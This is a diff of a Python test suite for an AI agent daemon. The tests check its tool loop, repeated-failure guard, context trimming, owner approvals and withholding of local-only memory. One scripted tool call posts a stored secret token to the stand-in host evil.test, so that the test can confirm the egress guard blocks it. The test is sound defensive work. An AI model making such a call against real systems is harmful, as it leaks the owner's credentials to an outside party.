@@ -1,13 +1,20 @@
 from __future__ import annotations
 
 import asyncio
+import json
 from datetime import datetime, timedelta
 from typing import Any
 
 from daedalus.config import Settings
-from daedalus.loop.engine import Engine
+from daedalus.loop.engine import _TRIMMED, Engine
 from daedalus.model.client import ModelClient
-from daedalus.model.providers import ChatResult, ScriptedProvider, ToolCall
+from daedalus.model.providers import (
+    ChatResult,
+    ContextOverflowError,
+    ScriptedProvider,
+    ToolCall,
+    TransientProviderError,
+)
 from daedalus.runtime import Runtime, build_runtime
 from daedalus.surface.base import InboundEvent
 from daedalus.surface.cli import ScriptedSurface
@@ -15,7 +22,33 @@ from daedalus.tools.base import Tool, ToolResult, params
 from tests.conftest import tool_call
 
 
-async def test_free_text_turn_runs_a_tool(runtime: Runtime) -> None:
+def _denied(settings: Settings) -> tuple[Runtime, ScriptedSurface]:
+    """A runtime whose owner denies every approval it is shown."""
+    surface = ScriptedSurface(approve=False)
+    return build_runtime(settings, surface=surface, provider=ScriptedProvider([])), surface
+
+
+async def test_a_turn_runs_its_steps_one_at_a_time_and_never_overlaps_another(
+    runtime: Runtime,
+) -> None:
+    """Free text drives the model/tool loop to an answer, one step at a time.
+
+    Two properties share this test because both are about *how a turn executes*:
+    the preview belongs to the current step rather than the whole turn, and the
+    lock belongs to the Runtime — so a re-sent message waits instead of racing
+    the first turn, swapping `ctx.session` (the policy every tool reads,
+    `local_only` included) and answering the owner out of order.
+    """
+    pieces: list[str] = []
+    restarts: list[int] = []
+
+    async def collect(piece: str) -> None:
+        pieces.append(piece)
+
+    async def restart() -> None:
+        restarts.append(1)
+
+    # case: one tool call, then prose — the tool's effect is real and remembered.
     runtime.model = ModelClient(
         runtime.settings,
         providers=[
@@ -27,13 +60,18 @@ async def test_free_text_turn_runs_a_tool(runtime: Runtime) -> None:
             )
         ],
     )
-    result = await Engine(runtime).run_turn(InboundEvent(text="remember we cut the release", user_id="owner"))
+    result = await Engine(runtime).run_turn(
+        InboundEvent(text="remember we cut the release", user_id="owner"),
+        on_delta=collect,
+        on_restart=restart,
+    )
     assert result.text == "Noted."
     assert result.tools_used == ["memory"]
     assert runtime.memory.recall("release")
+    assert "".join(pieces).strip() == "Noted.", "the streamed preview was not the answer"
+    assert len(restarts) == 2, "one preview reset before each model call, not per turn"
 
-
-async def test_multi_step_tool_loop(runtime: Runtime) -> None:
+    # case: the loop keeps going — write, read it back, then answer.
     runtime.model = ModelClient(
         runtime.settings,
         providers=[
@@ -50,44 +88,30 @@ async def test_multi_step_tool_loop(runtime: Runtime) -> None:
     assert result.steps == 3
     assert result.text.startswith("Wrote it")
 
+    # case: two messages, two Engine instances, one Runtime — the second waits.
+    _TurnRef.live = _TurnRef.peak = 0
+    runtime.tools.register(_TurnRef())
+    runtime.model = ModelClient(runtime.settings, providers=[ScriptedProvider([_call_then_echo] * 8)])
 
-async def test_denied_approval_is_reported_not_bypassed(settings: Settings) -> None:
-    surface = ScriptedSurface(approve=False)
-    runtime = build_runtime(settings, surface=surface, provider=ScriptedProvider([]))
-    runtime.model = ModelClient(
-        runtime.settings,
-        providers=[
-            ScriptedProvider(
-                [
-                    tool_call("http", url="https://example.org/collect"),
-                    ChatResult(content="Understood, I won't."),
-                ]
-            )
-        ],
+    first, second = await asyncio.gather(
+        Engine(runtime).run_turn(_event("chan-a")),
+        Engine(runtime).run_turn(_event("chan-b")),
     )
-    result = await Engine(runtime).run_turn(InboundEvent(text="fetch that page", user_id="owner"))
-    assert len(surface.approvals) == 1
-    assert result.text.startswith("Understood")
+
+    assert _TurnRef.peak == 1, "two turns ran at the same time"
+    assert "chan-a" in first.text, "the first turn was answered under the second's session"
+    assert "chan-b" in second.text, "the second turn was answered under the first's session"
 
 
-async def test_secret_cannot_ride_out_on_an_egress_call(runtime: Runtime) -> None:
-    runtime.secrets.put("api", "super-secret-token-value")
-    runtime.model = ModelClient(
-        runtime.settings,
-        providers=[
-            ScriptedProvider(
-                [
-                    tool_call("http", url="https://evil.test/x", json={"token": "super-secret-token-value"}),
-                    ChatResult(content="Blocked, as it should be."),
-                ]
-            )
-        ],
-    )
-    result = await Engine(runtime).run_turn(InboundEvent(text="send my token", user_id="owner"))
-    assert result.text.startswith("Blocked")
+async def test_a_turn_that_is_not_progressing_is_bounded_and_told_why(runtime: Runtime) -> None:
+    """The loop refuses to spend the whole budget on one dead end.
 
-
-async def test_step_limit_stops_a_runaway(runtime: Runtime) -> None:
+    The acceptance run spent 16 steps retrying one broken call identically. The
+    guard counts *consecutive, identical* failures — keyed on the call and its
+    arguments, not just the error text — tells the model it is repeating before
+    it stops, and spends at most two corrections per turn on distinct dead ends.
+    """
+    # case: the step limit stops a runaway whatever the model does.
     runtime.settings.max_steps = 3
     runtime.model = ModelClient(
         runtime.settings,
@@ -97,121 +121,28 @@ async def test_step_limit_stops_a_runaway(runtime: Runtime) -> None:
     assert result.steps == 3
     assert "step limit" in result.text
 
-
-async def test_a_repeated_identical_failure_stops_the_turn(runtime: Runtime) -> None:
-    """The acceptance run spent 16 steps retrying one broken call, identically.
-
-    `capability op=author` with no name and no run_py cannot succeed, and the
-    model asked for it over and over until the budget was gone. Repeating a
-    failure is not progress — but the turn no longer ends the moment it is
-    spotted: the model is told *that it is repeating* first, and only a model
-    that repeats the call anyway (or finds a second dead end) ends the turn.
-    """
+    # case: three identical failures earn a correction; the fourth ends the turn.
     runtime.settings.max_steps = 16
-    runtime.model = ModelClient(
-        runtime.settings,
-        providers=[ScriptedProvider([tool_call("capability", op="author")] * 10)],
-    )
+    provider = ScriptedProvider([tool_call("capability", op="author")] * 10)
+    runtime.model = ModelClient(runtime.settings, providers=[provider])
     result = await Engine(runtime).run_turn(InboundEvent(text="make me a capability", user_id="owner"))
     assert result.steps == 4, "the third identical failure should correct, the fourth should stop"
     assert result.error == "repeated failure"
     assert "stuck repeating" in result.text
-
-
-async def test_a_stuck_turn_names_its_error_whole_and_asks_for_the_ledger(runtime: Runtime) -> None:
-    """The 22:52 turn lost its evidence twice on the way out.
-
-    The reply interpolated the tool's raw error, and Discord italicised pairs
-    of `*` on the way to the owner — the pasted answer read `"0 7 * * "` where a
-    five-field cron had been. And the running ledger the owner had watched
-    disappear at the turn's end, leaving "I got stuck" with nothing beneath it
-    to scroll. The error now travels fenced, and a turn the loop stopped asks
-    the surface to hold its ledger — both already fixed where they were seen.
-    """
-    runtime.settings.max_steps = 16
-    runtime.model = ModelClient(
-        runtime.settings,
-        providers=[ScriptedProvider([tool_call("capability", op="author")] * 10)],
-    )
-    result = await Engine(runtime).run_turn(InboundEvent(text="make me a capability", user_id="owner"))
-
-    fences = result.text.count("```")
-    assert fences >= 2, f"the tool's error must travel fenced, or markdown rewrites it:\n{result.text}"
-
-    assert runtime.surface.held == 1, (
-        "a turn the loop stopped must ask the surface to keep its ledger — "
-        "the reply summarizes one failing call, the trace shows all of them"
-    )
-
-
-async def test_an_answered_turn_leaves_the_channel_clean(runtime: Runtime) -> None:
-    """The hold is for stopped turns, not a new standing behaviour."""
-    runtime.model = ModelClient(
-        runtime.settings, providers=[ScriptedProvider([ChatResult(content="done.")])]
-    )
-    result = await Engine(runtime).run_turn(InboundEvent(text="hello", user_id="owner"))
-
-    assert result.error == ""
-    assert runtime.surface.held == 0
-
-
-async def test_the_model_is_told_it_is_repeating_before_the_turn_ends(runtime: Runtime) -> None:
-    """A dead end the model never hears about is a dead end it cannot leave.
-
-    The old guard ended the turn on the third identical failure without a word
-    to the caller: the owner got "I got stuck", and the model got nothing. The
-    correction names the failing call, carries the tool's own error whole, and
-    tells the model not to send it again — so a model that *can* change course
-    gets the chance.
-    """
-    runtime.settings.max_steps = 16
-    provider = ScriptedProvider([tool_call("capability", op="author")] * 10)
-    runtime.model = ModelClient(runtime.settings, providers=[provider])
-
-    await Engine(runtime).run_turn(InboundEvent(text="make me a capability", user_id="owner"))
-
     told = [m for call in provider.calls for m in call if m.get("role") == "user"]
     correction = [m["content"] for m in told if m["content"].startswith("Stop —")]
     assert correction, "the model was never told it was repeating"
     assert "failed 3 times in a row" in correction[0]
 
-
-async def test_a_call_repeated_after_a_correction_ends_the_turn(runtime: Runtime) -> None:
-    """The correction is a chance, not a licence.
-
-    A model that sends the call it was just told to stop sending is not
-    thinking its way out of anything, so the turn ends at once rather than
-    spending two more identical failures earning a second nudge.
-    """
-    runtime.settings.max_steps = 16
-    runtime.model = ModelClient(
-        runtime.settings,
-        providers=[ScriptedProvider([tool_call("capability", op="author")] * 10)],
-    )
-    result = await Engine(runtime).run_turn(InboundEvent(text="make me a capability", user_id="owner"))
-    # 1, 2, 3 fail -> correction; 4 is identical -> stop. Not 6.
-    assert result.steps == 4
-
-
-async def test_two_dead_ends_each_get_one_correction_then_the_turn_ends(
-    runtime: Runtime,
-) -> None:
-    """The correction budget is finite, and it is spent on *distinct* calls."""
-    runtime.settings.max_steps = 16
+    # case: two distinct dead ends each get one correction; a third ends the turn.
     runtime.model = ModelClient(
         runtime.settings,
         providers=[
             ScriptedProvider(
                 [
-                    tool_call("capability", op="author", name="alpha"),
-                    tool_call("capability", op="author", name="alpha"),
-                    tool_call("capability", op="author", name="alpha"),
-                    tool_call("capability", op="author", name="beta"),
-                    tool_call("capability", op="author", name="beta"),
-                    tool_call("capability", op="author", name="beta"),
-                    tool_call("capability", op="author", name="gamma"),
-                    tool_call("capability", op="author", name="gamma"),
-                    tool_call("capability", op="author", name="gamma"),
+                    *([tool_call("capability", op="author", name="alpha")] * 3),
+                    *([tool_call("capability", op="author", name="beta")] * 3),
+                    *([tool_call("capability", op="author", name="gamma")] * 3),
                     ChatResult(content="Never reached."),
                 ]
             )
@@ -219,14 +150,9 @@ async def test_two_dead_ends_each_get_one_correction_then_the_turn_ends(
     )
     result = await Engine(runtime).run_turn(InboundEvent(text="author things", user_id="owner"))
     assert result.error == "repeated failure", "a third dead end must not get a third correction"
-    # alpha: 3 fails -> correction; beta: 3 fails -> correction (the budget is
-    # now spent); gamma: its third failure ends the turn rather than correcting.
     assert result.steps == 9
 
-
-async def test_progress_between_failures_does_not_stop_the_turn(runtime: Runtime) -> None:
-    """The guard counts *consecutive* identical failures, not failures overall."""
-    runtime.settings.max_steps = 8
+    # case: progress between failures resets the count.
     runtime.model = ModelClient(
         runtime.settings,
         providers=[
@@ -243,16 +169,7 @@ async def test_progress_between_failures_does_not_stop_the_turn(runtime: Runtime
     result = await Engine(runtime).run_turn(InboundEvent(text="try again", user_id="owner"))
     assert result.text == "Recovered."
 
-
-async def test_different_failing_calls_are_not_collapsed_into_one(runtime: Runtime) -> None:
-    """The guard keys on the call, not just the error text.
-
-    Three different attempts to author a capability with three different names
-    fail with the *same* message (`run_py` was missing). Keyed on the error alone
-    they looked like one repeated step and the turn was cut short; keyed on the
-    arguments too, each attempt is its own failure and the turn can recover.
-    """
-    runtime.settings.max_steps = 8
+    # case: same error, different arguments — three attempts, not one repeat.
     runtime.model = ModelClient(
         runtime.settings,
         providers=[
@@ -266,154 +183,165 @@ async def test_different_failing_calls_are_not_collapsed_into_one(runtime: Runti
             )
         ],
     )
-
     result = await Engine(runtime).run_turn(InboundEvent(text="author three probes", user_id="owner"))
-
     assert result.text == "Recovered.", "different calls were collapsed into a repeat"
     assert result.steps == 4
 
 
-async def test_the_stuck_message_shows_the_call_it_made(runtime: Runtime) -> None:
-    """The owner is asked to diagnose from the whole picture, not half of it."""
+async def test_a_stopped_turn_tells_the_owner_what_happened_and_holds_the_ledger(
+    runtime: Runtime,
+) -> None:
+    """A turn the loop stopped is explained, not left as "I got stuck".
+
+    The tool's error travels fenced (markdown would otherwise eat the asterisks
+    in a cron), the running ledger is held rather than deleted, the arguments
+    that kept failing are shown, and a tool that refused with a question hands
+    that question up instead of an account of the loop's own bad turn.
+    """
+    # case: a stuck turn fences the error and asks the surface to keep its ledger.
+    runtime.settings.max_steps = 16
+    runtime.model = ModelClient(
+        runtime.settings,
+        providers=[ScriptedProvider([tool_call("capability", op="author")] * 10)],
+    )
+    result = await Engine(runtime).run_turn(InboundEvent(text="make me a capability", user_id="owner"))
+    assert result.text.count("```") >= 2, (
+        f"the tool's error must travel fenced, or markdown rewrites it:\n{result.text}"
+    )
+    held_after_stuck = runtime.surface.held
+    assert held_after_stuck == 1, (
+        "a turn the loop stopped must ask the surface to keep its ledger — "
+        "the reply summarizes one failing call, the trace shows all of them"
+    )
+
+    # case: the hold is for stopped turns — an answered turn does not add one.
+    runtime.model = ModelClient(
+        runtime.settings, providers=[ScriptedProvider([ChatResult(content="done.")])]
+    )
+    result = await Engine(runtime).run_turn(InboundEvent(text="hello", user_id="owner"))
+    assert result.error == ""
+    assert runtime.surface.held == held_after_stuck
+
+    # case: the arguments that kept failing are shown to the owner.
     runtime.settings.max_steps = 8
     runtime.model = ModelClient(
         runtime.settings,
         providers=[ScriptedProvider([tool_call("capability", op="author", name="probe")] * 5)],
     )
-
     result = await Engine(runtime).run_turn(InboundEvent(text="author probe", user_id="owner"))
-
     assert result.error == "repeated failure"
     assert "probe" in result.text, "the arguments that kept failing were not shown"
 
+    # case: the tool's refusal was a question — hand it up, with the ids.
+    first = runtime.calendar.add(summary="LeetCode Weekly Contest 524", start="2026-10-18T08:00")
+    second = runtime.calendar.add(summary="LeetCode Weekly Contest 524", start="2026-10-18T08:00")
+    runtime.settings.max_steps = 16
+    runtime.model = ModelClient(
+        runtime.settings,
+        providers=[
+            ScriptedProvider([tool_call("calendar", op="delete", summary="LeetCode Weekly Contest 524")] * 8)
+        ],
+    )
+    result = await Engine(runtime).run_turn(InboundEvent(text="drop the leetcode reminder", user_id="owner"))
+    assert result.error == "repeated failure"
+    assert "which one to remove" in result.text, "the owner was not asked what only they know"
+    assert first.uid in result.text and second.uid in result.text, (
+        "the owner cannot answer without the ids that tell the two apart"
+    )
+    assert "I got stuck" not in result.text and "The call was" not in result.text
 
-async def test_an_empty_turn_is_never_swallowed(runtime: Runtime) -> None:
-    """An empty answer and a dead daemon must not look the same from outside.
+    # case: no question to ask — the report stays a report.
+    runtime.model = ModelClient(
+        runtime.settings, providers=[ScriptedProvider([tool_call("capability", op="author")] * 8)]
+    )
+    result = await Engine(runtime).run_turn(InboundEvent(text="author something", user_id="owner"))
+    assert result.error == "repeated failure"
+    assert "I got stuck" in result.text
 
-    `deliver` is the one shared boundary every surface sends through; a turn
-    with no text is reported rather than silently dropped.
-    """
+    # case: an empty answer is delivered as a fallback, never swallowed.
     from daedalus.loop.engine import TurnResult
     from daedalus.main import deliver
 
-    surface = runtime.surface
-    used_fallback = await deliver(surface, TurnResult(text="", error=""))
-
+    sent_before = len(runtime.surface.sent)
+    used_fallback = await deliver(runtime.surface, TurnResult(text="", error=""))
     assert used_fallback is True
-    assert surface.sent and surface.sent[-1].strip(), "nothing was sent for an empty turn"
+    assert len(runtime.surface.sent) > sent_before, "nothing was sent for an empty turn"
+    assert runtime.surface.sent[-1].strip()
 
 
-async def test_local_only_memory_never_reaches_a_remote_model(runtime: Runtime) -> None:
-    """SPEC §5: `local_only` content never goes to a remote model.
-
-    The system prompt carries recent memory, so a `local_only` fact sitting in
-    the facade would ride out on every turn. It is withheld unless the whole
-    chain the turn will use is local.
-    """
-    from daedalus.security.provenance import DataClass
-
-    runtime.memory.write(facet="body", content="a shareable fact")
-    runtime.memory.write(facet="body", content="a local secret", data_class=DataClass.LOCAL_ONLY)
-
-    provider = ScriptedProvider([ChatResult(content="ok")])
-    runtime.model = ModelClient(runtime.settings, providers=[provider])
-
-    await Engine(runtime).run_turn(InboundEvent(text="hello", user_id="owner"))
-
-    sent = provider.calls[0][0]["content"]
-    assert "a shareable fact" in sent
-    assert "a local secret" not in sent, "a local_only fact left the machine"
-
-
-async def test_local_only_memory_reaches_a_fully_local_model(runtime: Runtime) -> None:
-    """When nothing leaves the machine, withholding the fact would be pointless."""
-    from daedalus.security.provenance import DataClass
-
-    runtime.memory.write(facet="body", content="a local secret", data_class=DataClass.LOCAL_ONLY)
-
-    provider = ScriptedProvider([ChatResult(content="ok")], is_local=True)
-    runtime.model = ModelClient(runtime.settings, providers=[provider])
-
-    await Engine(runtime).run_turn(InboundEvent(text="hello", user_id="owner"))
-
-    assert "a local secret" in provider.calls[0][0]["content"]
-
-
-async def test_the_memory_tool_withholds_local_only_from_a_remote_turn(runtime: Runtime) -> None:
-    """A recall result is fed straight back to the model — same rule applies."""
-    from daedalus.security.provenance import DataClass
-
-    runtime.memory.write(facet="body", content="a local secret", data_class=DataClass.LOCAL_ONLY)
-    provider = ScriptedProvider(
-        [
-            tool_call("memory", op="recall", query="local", content="", facet="body"),
-            ChatResult(content="done"),
-        ]
+async def test_a_refusal_is_reported_to_the_model_and_never_bypassed(
+    runtime: Runtime, settings: Settings
+) -> None:
+    """A guard that refuses must say so; the turn may not route around it."""
+    # case: the owner denied the approval — reported, not run.
+    gate, surface = _denied(settings)
+    gate.model = ModelClient(
+        gate.settings,
+        providers=[
+            ScriptedProvider(
+                [
+                    tool_call("http", url="https://example.org/collect"),
+                    ChatResult(content="Understood, I won't."),
+                ]
+            )
+        ],
     )
-    runtime.model = ModelClient(runtime.settings, providers=[provider])
+    result = await Engine(gate).run_turn(InboundEvent(text="fetch that page", user_id="owner"))
+    assert len(surface.approvals) == 1
+    assert result.text.startswith("Understood")
 
-    await Engine(runtime).run_turn(InboundEvent(text="what do you know", user_id="owner"))
-
-    results = [m for m in provider.calls[-1] if m.get("role") == "tool"]
-    assert results, "the tool result never made it back to the model"
-    assert "a local secret" not in results[-1]["content"]
-
-
-async def test_the_approval_title_names_the_operation(settings: Settings) -> None:
-    """`capability` is six tools in one; the headline must not always say 'author'."""
-    surface = ScriptedSurface(approve=False)
-    runtime = build_runtime(settings, surface=surface, provider=ScriptedProvider([]))
+    # case: a known secret in an egress body blocks the call before it leaves.
+    runtime.secrets.put("api", "super-secret-token-value")
     runtime.model = ModelClient(
         runtime.settings,
         providers=[
             ScriptedProvider(
                 [
-                    tool_call("capability", op="remove", name="probe"),
-                    ChatResult(content="ok"),
+                    tool_call("http", url="https://evil.test/x", json={"token": "super-secret-token-value"}),
+                    ChatResult(content="Blocked, as it should be."),
                 ]
             )
         ],
     )
+    result = await Engine(runtime).run_turn(InboundEvent(text="send my token", user_id="owner"))
+    assert result.text.startswith("Blocked")
 
-    await Engine(runtime).run_turn(InboundEvent(text="delete the probe capability", user_id="owner"))
 
+async def test_the_owner_is_asked_about_the_operation_that_will_run_and_a_denial_is_final(
+    settings: Settings,
+) -> None:
+    """The prompt names the operation, invents no noun, and is asked once."""
+    # case: `capability` is six tools in one — the title names the one in use.
+    gate, surface = _denied(settings)
+    gate.model = ModelClient(
+        gate.settings,
+        providers=[
+            ScriptedProvider(
+                [tool_call("capability", op="remove", name="probe"), ChatResult(content="ok")]
+            )
+        ],
+    )
+    await Engine(gate).run_turn(InboundEvent(text="delete the probe capability", user_id="owner"))
     request = surface.approvals[0]
     assert request.title == "Delete a capability"
     assert "Author" not in request.describe()
 
-
-async def test_a_malformed_call_says_what_is_wrong(settings: Settings) -> None:
-    """The model sent `op=remove` with no name; the prompt must not invent a noun.
-
-    It used to read "delete the authored capability 'an unnamed capability'" —
-    a destructive prompt for a call that would delete nothing.
-    """
-    surface = ScriptedSurface(approve=False)
-    runtime = build_runtime(settings, surface=surface, provider=ScriptedProvider([]))
-    runtime.model = ModelClient(
-        runtime.settings,
+    # case: `op=remove` with no name says what is wrong, not "an unnamed capability".
+    gate, surface = _denied(settings)
+    gate.model = ModelClient(
+        gate.settings,
         providers=[ScriptedProvider([tool_call("capability", op="remove"), ChatResult(content="ok")])],
     )
-
-    await Engine(runtime).run_turn(InboundEvent(text="delete it", user_id="owner"))
-
+    await Engine(gate).run_turn(InboundEvent(text="delete it", user_id="owner"))
     described = surface.approvals[0].describe()
     assert "an unnamed capability" not in described
     assert "no target" in described or "named no" in described
-    # ...and it must not warn about an irreversible delete that would not happen.
-    assert "cannot be undone" not in described
+    assert "cannot be undone" not in described, "it warned about a delete that would not happen"
 
-
-async def test_a_denial_stops_the_turn_asking_again(settings: Settings) -> None:
-    """A denied call is not retried: the owner already answered it.
-
-    Two identical prompts for one broken call is how the owner ends up clicking
-    deny twice and wondering whether the first one registered.
-    """
-    surface = ScriptedSurface(approve=False)
-    runtime = build_runtime(settings, surface=surface, provider=ScriptedProvider([]))
-    runtime.model = ModelClient(
-        runtime.settings,
+    # case: a denial is not re-asked. The owner already answered it.
+    gate, surface = _denied(settings)
+    gate.model = ModelClient(
+        gate.settings,
         providers=[
             ScriptedProvider(
                 [
@@ -424,18 +352,67 @@ async def test_a_denial_stops_the_turn_asking_again(settings: Settings) -> None:
             )
         ],
     )
-
-    result = await Engine(runtime).run_turn(InboundEvent(text="delete the probe", user_id="owner"))
-
+    result = await Engine(gate).run_turn(InboundEvent(text="delete the probe", user_id="owner"))
     assert len(surface.approvals) == 1, "the owner was asked to deny the same call twice"
     assert result.error == "denied"
     assert "denied" in result.text.lower()
 
 
-async def test_one_huge_tool_result_cannot_flood_the_context(runtime: Runtime) -> None:
-    """A 25 KB read in the failed run degraded every model call after it."""
-    from daedalus.loop.engine import MAX_TOOL_CHARS
+async def test_local_only_content_never_reaches_a_remote_model(runtime: Runtime) -> None:
+    """SPEC §5: `local_only` values stay home unless the whole chain is local.
 
+    The system prompt carries recent memory and a recall result is fed straight
+    back to the model, so both paths are gated — and both are opened when the
+    model itself is local, because then nothing leaves.
+    """
+    from daedalus.security.provenance import DataClass
+
+    # case: the prompt withholds it from a remote model.
+    runtime.memory.write(facet="body", content="a shareable fact")
+    runtime.memory.write(facet="body", content="a local secret", data_class=DataClass.LOCAL_ONLY)
+    provider = ScriptedProvider([ChatResult(content="ok")])
+    runtime.model = ModelClient(runtime.settings, providers=[provider])
+    await Engine(runtime).run_turn(InboundEvent(text="hello", user_id="owner"))
+    sent = provider.calls[0][0]["content"]
+    assert "a shareable fact" in sent
+    assert "a local secret" not in sent, "a local_only fact left the machine"
+
+    # case: a fully local chain may see it — nothing leaves the machine anyway.
+    local = ScriptedProvider([ChatResult(content="ok")], is_local=True)
+    runtime.model = ModelClient(runtime.settings, providers=[local])
+    await Engine(runtime).run_turn(InboundEvent(text="hello", user_id="owner"))
+    assert "a local secret" in local.calls[0][0]["content"]
+
+    # case: a tool result fed back to a remote model is held to the same rule.
+    recall = ScriptedProvider(
+        [
+            tool_call("memory", op="recall", query="local", content="", facet="body"),
+            ChatResult(content="done"),
+        ]
+    )
+    runtime.model = ModelClient(runtime.settings, providers=[recall])
+    await Engine(runtime).run_turn(InboundEvent(text="what do you know", user_id="owner"))
+    results = [m for m in recall.calls[-1] if m.get("role") == "tool"]
+    assert results, "the tool result never made it back to the model"
+    assert "a local secret" not in results[-1]["content"]
+
+
+async def test_the_context_is_kept_within_the_window_by_trimming_only_old_tool_results(
+    runtime: Runtime, monkeypatch: Any
+) -> None:
+    """The system prompt, the ask and the last two results are never trimmed.
+
+    One 25 KB result degraded every later model call, so a single result is
+    capped. On overflow (or before it, from the budget) the oldest tool results
+    are replaced with a marker: recovery is not progress and spends no step, a
+    second overflow is refused in the owner's words, and an unsatisfiable budget
+    says so instead of looping. An unknown window is not guessed at.
+    """
+    from daedalus.loop import engine as engine_mod
+    from daedalus.loop.budget import over_budget
+    from daedalus.loop.engine import MAX_TOOL_CHARS, _fit_context
+
+    # case: one huge tool result is capped with a marker before it is fed back.
     big = runtime.settings.home / "big.txt"
     big.write_text("x" * (MAX_TOOL_CHARS * 3))
     provider = ScriptedProvider(
@@ -445,9 +422,7 @@ async def test_one_huge_tool_result_cannot_flood_the_context(runtime: Runtime) -
         ]
     )
     runtime.model = ModelClient(runtime.settings, providers=[provider])
-
     result = await Engine(runtime).run_turn(InboundEvent(text="read the big file", user_id="owner"))
-
     assert result.text == "Read a slice of it."
     tool_messages = [m for m in provider.calls[-1] if m.get("role") == "tool"]
     assert tool_messages, "the tool result never made it back to the model"
@@ -455,74 +430,114 @@ async def test_one_huge_tool_result_cannot_flood_the_context(runtime: Runtime) -
     assert "truncated" in fed_back, "the whole file was fed back unchecked"
     assert len(fed_back) < MAX_TOOL_CHARS + 500
 
+    # case: an overflow trims the oldest result, retries, and spends no step.
+    provider = OverflowsOnce(_three_notes_and_an_answer())
+    runtime.model = ModelClient(runtime.settings, providers=[provider])
+    result = await Engine(runtime).run_turn(InboundEvent(text="keep three notes", user_id="owner"))
+    assert result.text == "Answered with less."
+    assert provider.calls == 5
+    assert result.steps == 4, "recovery is not progress and must not spend a step"
+    tool_messages = [m for m in provider.seen[-1] if m.get("role") == "tool"]
+    assert len(tool_messages) == 3
+    assert tool_messages[0]["content"] == _TRIMMED
+    assert tool_messages[1]["content"] != _TRIMMED
+    assert tool_messages[2]["content"] != _TRIMMED, "the last two results are what it is using"
 
-# -- the turn is remembered however it ends ---------------------------------
+    # case: a second overflow is refused in the owner's words, not retried forever.
+    provider = OverflowsOnce(_three_notes_and_an_answer(), always=True)
+    runtime.model = ModelClient(runtime.settings, providers=[provider])
+    result = await Engine(runtime).run_turn(InboundEvent(text="keep three notes", user_id="owner"))
+    assert "bigger than the model's context window" in result.text
+    assert result.error.startswith("context overflow")
+
+    # case: the same trim, applied before the call — oldest goes, newest stays.
+    messages: list[dict[str, Any]] = [
+        {"role": "system", "content": "system " * 100},
+        {"role": "tool", "tool_call_id": "1", "content": "a" * 8000},
+        {"role": "tool", "tool_call_id": "2", "content": "b" * 8000},
+        {"role": "tool", "tool_call_id": "3", "content": "c" * 8000},
+        {"role": "user", "content": "the ask"},
+    ]
+    assert over_budget(messages, 7000), "the request is over the window's budget"
+    assert _fit_context(messages, 7000) is True
+    assert messages[0]["content"] == "system " * 100, "the system prompt is never touched"
+    assert messages[-1]["content"] == "the ask", "the ask is never touched"
+    assert messages[1]["content"] == _TRIMMED
+    assert messages[2]["content"] == "b" * 8000
+    assert messages[3]["content"] == "c" * 8000, "the last two results are what it is using"
+    assert not over_budget(messages, 7000)
+
+    # case: a budget that cannot be met refuses without destroying anything.
+    stuck = [
+        {"role": "system", "content": "s"},
+        {"role": "tool", "tool_call_id": "1", "content": "a" * 8000},
+        {"role": "tool", "tool_call_id": "2", "content": "b" * 8000},
+        {"role": "user", "content": "the ask"},
+    ]
+    assert _fit_context(stuck, 100) is False
+    assert stuck[1]["content"] == "a" * 8000, "nothing was destroyed for nothing"
+
+    # case: the engine consults the budget once per step, with the chain's window.
+    seen: list[int] = []
+
+    def fake_fit(messages: list[dict[str, Any]], window: int, extra: int = 0) -> bool:
+        seen.append(window)
+        return False
+
+    monkeypatch.setattr(engine_mod, "_fit_context", fake_fit)
+    runtime.model = ModelClient(
+        runtime.settings, providers=[ScriptedProvider([ChatResult(content="hi")])]
+    )
+    runtime.model.context_window = lambda *a, **k: 4096  # type: ignore[method-assign]
+    await Engine(runtime).run_turn(InboundEvent(text="hi", user_id="owner"))
+    assert seen == [4096]
+
+    # case: an unknown window means let the provider answer.
+    seen.clear()
+    runtime.model = ModelClient(
+        runtime.settings, providers=[ScriptedProvider([ChatResult(content="hi")])]
+    )
+    runtime.model.context_window = lambda *a, **k: 0  # type: ignore[method-assign]
+    await Engine(runtime).run_turn(InboundEvent(text="hi", user_id="owner"))
+    assert seen == [], "an unknown window means let the provider answer"
 
 
-async def test_a_turn_that_ends_in_a_dead_end_is_still_remembered(runtime: Runtime) -> None:
-    """The owner's words survive a turn that went nowhere.
+async def test_a_conversation_outlives_a_dead_end_and_a_restart(runtime: Runtime) -> None:
+    """A turn is remembered however it ends, and a restart is not amnesia.
 
     Only turns that ended in prose were recorded, so a turn the guard cut short
-    left no trace at all — the next turn read a conversation that had never
-    contained the owner's last message. That is why the same request could be
-    made four times in one evening with no sign it had been heard.
+    left no trace and the owner's last message was dropped; and `history` lived
+    in the process, so a daemon restart erased the conversation. Both are now in
+    the transcript, and the transcript is replayed into the next prompt.
     """
+    # case: a dead end still leaves the owner's words and the stop reply behind.
     runtime.model = ModelClient(
         runtime.settings,
         providers=[ScriptedProvider([tool_call("capability", op="author")] * 5)],
     )
-
-    result = await Engine(runtime).run_turn(
-        InboundEvent(text="give me a contest alert", user_id="owner")
-    )
-
+    result = await Engine(runtime).run_turn(InboundEvent(text="give me a contest alert", user_id="owner"))
     assert result.error == "repeated failure"
     remembered = [m["content"] for m in runtime.recent("owner", 24)]
     assert "give me a contest alert" in remembered, "the owner's message was dropped"
     assert "stuck repeating" in remembered[-1], "the reply that ended the turn was dropped"
 
-
-async def test_a_conversation_survives_a_restart(runtime: Runtime) -> None:
-    """A daemon restart is not amnesia.
-
-    The acceptance transcript spans one: the daemon died and came back, and the
-    conversation carried on as if it had never been. `history` was a dict in the
-    process, so everything said before the restart was gone — half of why the
-    agent kept asking what the owner was working on.
-    """
+    # case: an answered turn survives a new process, and is replayed to the model.
     runtime.model = ModelClient(
-        runtime.settings,
-        providers=[ScriptedProvider([ChatResult(content="Noted.")])],
-    )
-    await Engine(runtime).run_turn(InboundEvent(text="remember the drill", user_id="owner"))
-
-    restarted = build_runtime(runtime.settings, provider=ScriptedProvider([]))
-
-    conversation = restarted.recent("owner", 24)
-    assert conversation, "the conversation did not outlive the process"
-    assert conversation[0]["content"] == "remember the drill"
-    assert conversation[-1]["content"] == "Noted."
-
-
-async def test_a_restarted_conversation_is_replayed_into_the_prompt(runtime: Runtime) -> None:
-    """Remembered is not enough — it has to reach the model."""
-    runtime.model = ModelClient(
-        runtime.settings,
-        providers=[ScriptedProvider([ChatResult(content="Noted.")])],
+        runtime.settings, providers=[ScriptedProvider([ChatResult(content="Noted.")])]
     )
     await Engine(runtime).run_turn(InboundEvent(text="the deadline is Friday", user_id="owner"))
 
     restarted = build_runtime(runtime.settings, provider=ScriptedProvider([]))
